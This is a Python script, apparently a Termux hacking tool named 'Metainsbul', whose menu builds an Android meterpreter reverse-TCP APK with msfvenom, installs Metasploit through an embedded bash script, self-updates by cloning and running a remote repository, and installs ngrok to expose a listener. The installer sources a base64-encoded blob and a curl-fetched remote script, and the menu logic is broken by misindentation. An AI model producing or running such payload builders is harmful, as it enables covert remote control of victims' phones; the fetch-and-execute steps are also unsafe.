import os

def build_payload():
    lhost = input("LHOST - ")
    lport = input("LPORT - ")
    apk_name = input("Payload Name - ")
    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
    print("IN FOLDERS SECTION")

    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"

    print(msfvenom_command)

    os.system(msfvenom_command)

    os.system(f"mv {apk_name}.apk /storage/emulated/0/")

def update():
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

def install_metasploit():
    os.system('''
    #!/data/data/com.termux/files/usr/bin/bash
    clear
    echo "
─────────▀▀▀▀▀▀──────────▀▀▀▀▀▀▀
──────▀▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀▀▀▀▀▀
────▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────▀▀▀
───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────────▀▀
──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀─────▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀───▀▀▀▀▀▀▀▀──────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
─▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
──▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀
───▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀▀
─────▀▀▀▀▀▀▀▀▀▀▀▀▀───────────────▀▀▀
──────▀▀▀▀▀▀▀▀▀▀▀───▀▀▀────────▀▀▀
────────▀▀▀▀▀▀▀▀▀──▀▀▀▀▀────▀▀▀▀
───────────▀▀▀▀▀▀───▀▀▀───▀▀▀▀
─────────────▀▀▀▀▀─────▀▀▀▀
────────────────▀▀▀──▀▀▀▀
──────────────────▀▀▀▀
───────────────────▀▀
    ...Installing Metasploit.........
    scprit by Gushmazuko Modified by KiNGEX

    "
    termux-setup-storage
    apt update && apt upgrade -y
    pkg install git -y
    pkg install wget -y
    pkg install wget curl openssh git -y
    apt install ncurses-utils
    pkg install ruby -y

    center() {
      termwidth=$(stty size | cut -d" " -f2)
      padding="$(printf '%0.1s' ={1..500})"
      printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
    }

    # Loading spinner
    center " Loading..."
    source <(echo "c3Bpbm5lcj0oICd8JyAnLycgJy0nICdcJyApOwoKY291bnQoKXsKICBzcGluICYKICBwaWQ9JCEKICBmb3IgaSBpbiBgc2VxIDEgMTBgCiAgZG8KICAgIHNsZWVwIDE7CiAgZG9uZQoKICBraWxsICRwaWQgIAp9CgpzcGluKCl7CiAgd2hpbGUgWyAxIF0KICBkbyAKICAgIGZvciBpIGluICR7c3Bpbm5lcltAXX07IAogICAgZG8gCiAgICAgIGVjaG8gLW5lICJcciRpIjsKICAgICAgc2xlZXAgMC4yOwogICAgZG9uZTsKICBkb25lCn0KCmNvdW50" | base64 -d)

    echo
    center "*** Dependencies installation..."

    pkg upgrade -y -o Dpkg::Options::="--force-confnew"

    pkg install -y binutils python autoconf bison clang coreutils curl findutils apr apr-util postgresql openssl readline libffi libgmp libpcap libsqlite libgrpc libtool libxml2 libxslt ncurses make ncurses-utils ncurses git ruby -o Dpkg::Options::="--force-confnew" python-pip

    python3 -m pip install --upgrade pip
    python3 -m pip install requests

    echo
    center "*** Fix ruby BigDecimal"
    source <(curl -sL https://github.com/termux/termux-packages/files/2912002/fix-ruby-bigdecimal.sh.txt)

    echo
    center "*** Erasing old metasploit folder..."
    rm -rf $PREFIX/opt/metasploit-framework

    echo
    center "*** Downloading..."
    cd /data/data/com.termux/files/home
    git clone https://github.com/rapid7/metasploit-framework.git --depth=1

    echo
    center "*** Installation..."
    cd /data/data/com.termux/files/home/metasploit-framework
    sed -i 's/nio4r (2.5.8)/nio4r (2.5.9)/' Gemfile.lock

    gem install bundler
    declare NOKOGIRI_VERSION=$(cat Gemfile.lock | grep -i nokogiri | sed 's/nokogiri [\(\)]/(/g' | cut -d ' ' -f 5 | grep -oP "(.).[[:digit:]][\w+]?[.].")
    gem install nokogiri -v $NOKOGIRI_VERSION -- --use-system-libraries

    gem install actionview -v 7.0.0
    bundle update activesupport
    bundle update --bundler
    bundle install -j$(nproc --all)
    bundle update --bundler

    if [ -e $PREFIX/bin/msfconsole ];then
        rm $PREFIX/bin/msfconsole
    fi
    if [ -e $PREFIX/bin/msfvenom ];then
        rm $PREFIX/bin/msfvenom
    fi
    if [ -e $PREFIX/bin/msfrpcd ];then
        rm $PREFIX/bin/msfrpcd
    fi
    ln -s /data/data/com.termux/files/home/metasploit-framework/msfconsole $PREFIX/bin/
    ln -s /data/data/com.termux/files/home/metasploit-framework/msfvenom $PREFIX/bin/
    ln -s /data/data/com.termux/files/home/opt/metasploit-framework/msfrpcd $PREFIX/bin/

    termux-elf-cleaner $PREFIX/lib/ruby/gems/*/gems/pg-*/lib/pg_ext.so

    echo
    center "*"
    echo -e "\033[32m Suppressing Warnings\033[0m"

    echo
    center "*"
    echo -e "\033[32m Installation complete. \n Launch metasploit by executing: msfconsole\033[0m"
    center "*"

    ''')

def launch_metasploit():
    os.system("msfconsole")

while True:
    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
    print(" By KiNGEX | https://GitHub.com/KiNGEX1")
    print("__________________________________________")
    
    print("Options:")
    print("1. Build Payload")
    print("2. Install Metasploit")
    print("3. Launch Metasploit")
    print("4. Update Metainsbul (Recommended)") 
    print("5. Ngrok Install & Start")
    print("6. Ngrok Install")

    choice = input("Enter your choice: ").strip()

    if choice == '1':
        build_payload() 
    elif choice == '2':
        install_metasploit()
    elif choice == '3':
        launch_metasploit()
    elif choice == '4':
        update()
    elif choice == '5':
        break
    elif choice == '6':
        
     print("What's the architecture of your device?")
     print("1. Arm-64")
     print("2. Arm-32 bit")
     architecture_choice = input("Enter your choice: ").strip()

    if architecture_choice == '1':
        os.system("pkg install wget -y")
        os.system("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz")
        os.system("tar -xvzf ngrok-v3-stable-linux-arm64.tgz")
        os.system("chmod +x ngrok")
        ngrok_token = input("Enter your ngrok authentication token: ").strip()
        os.system(f"./ngrok authtoken {ngrok_token}")
        os.system("./ngrok config upgrade")
        name = input(" Enter your Port =")
        os.system(f"./ngrok http {name}")
    elif architecture_choice == '2':
        os.system("pkg install wget -y")
        os.system("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz")
        os.system("tar -xvzf ngrok-v3-stable-linux-386.tgz")
        os.system("chmod +x ngrok")
        ngrok_token = input("Enter your ngrok authentication token: ").strip()
        os.system(f"./ngrok authtoken {ngrok_token}")
        os.system("./ngrok config upgrade")
        name = input(" Port =")
        os.system(f"./ngrok http {name}")
    else:
        print("Invalid architecture choice. Please select a valid option.")
    
